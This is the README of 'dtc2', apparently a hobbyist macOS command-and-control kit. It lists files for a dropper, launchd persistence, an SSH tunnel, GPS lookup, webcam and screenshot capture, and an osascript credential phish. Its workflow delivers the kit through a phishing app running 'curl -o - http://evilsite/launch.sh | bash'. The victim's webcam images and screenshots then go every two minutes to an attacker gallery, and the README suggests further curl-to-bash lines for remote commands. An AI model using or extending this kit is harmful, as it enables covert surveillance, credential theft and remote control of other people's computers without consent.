# dtc2
Duct Tape Command and Control!

WARNING: You will ABSOLUTELY NEED to go into these files and edit them: dtc2.sh, launch.sh, tunnel.sh, upload.php, hax.plist. There are placeholders for where you need to put the domain or ip or host you intend to host some of these things on, and some small tweaks, but nothing that won't take you ~3 minutes. It's worth considering creating a 'generator' shellscript to spit out the 'finished' versions of these files so that you don't have to edit a bunch of files every time you wish to use dtc2. That's for later though :)


A quick file list:

- Airport.sh: this is just a shortcut to the airport binary on OSX
- dtc2.plist: this is the plist file that gets generated at 'exploit time', and runs dtc2.sh on a timer (2 min) - this is just an example of the output of launch.sh.
- geo.m: you compile this into a binary to get GPS coords from macs
- hax.plist: this is a plist that runs tunnel.sh, to make sure an ssh tunnel stays alive
- imagesnap: a binary that takes webcam pics (yes, it does fire the green light)
- launch.sh: this is the initial dropper. It creates dirs, and installs files, scripts binaries, etc, launches first evil things.
- meterp.py: skeleton for python meterpreter. this can probably be deleted.
- dtc2.sh: this script takes screenshots and webcam pics, then uploads them to a shitty catcher php script you host somewhere
- tunnel.sh: a simple bash loop to keep an ssh tunnel alive.
- gallery.html: a terrible, but simple drop-in gallery
- getImages.php: this builds the imagelist for the gallery html
- style.css: css for gallery
- upload.php: terrible file upload catcher. gets files for you and dumps them in a gallery dir
- osascript.sh: an example of osascript, used to locally-phish a user. try it on yourself! :D 

DISCLAIMER: Most of this code has been cobbled together, duct tape and bailing wire style (duct tape c2, get it now?), it is horribly vulnerable, and could use a lot of polish and work.

WORKFLOW:
First you'd stand up your site somewhere, drop gallery files into place. You'd then edit various files to update them with the url/ip/host info to match your environment

Then, you would use platypus to create your payload for a phish, in it you would simply have it run: curl -o - http://evilsite/launch.sh | bash

That would download and execute launch.sh, which would create all the dirs, drop files in place, create the plist files, then install and run them.
At that point you should have at least one shell, and the target computer should have a plist installed which runs 'dtc2.sh', which should be taking webcam pics and screenshots every two minutes and uploading them to the gallery. 

As an exercise left to the reader, at this point you can elect to install the plist for an ssh tunnel if you wish, or modify dtc2.sh to conduct any sort of post-exploit ops you wish. 
One idea is to add another 'curl to bash' line at the end and have it fetch somethinglike 'additonal instructions' as a shellscript to run in the event you want an asycnchronous command to be run, say in the event you lose all of your shells, or they install little snitch or something. 

Please help me make this thing awesome?
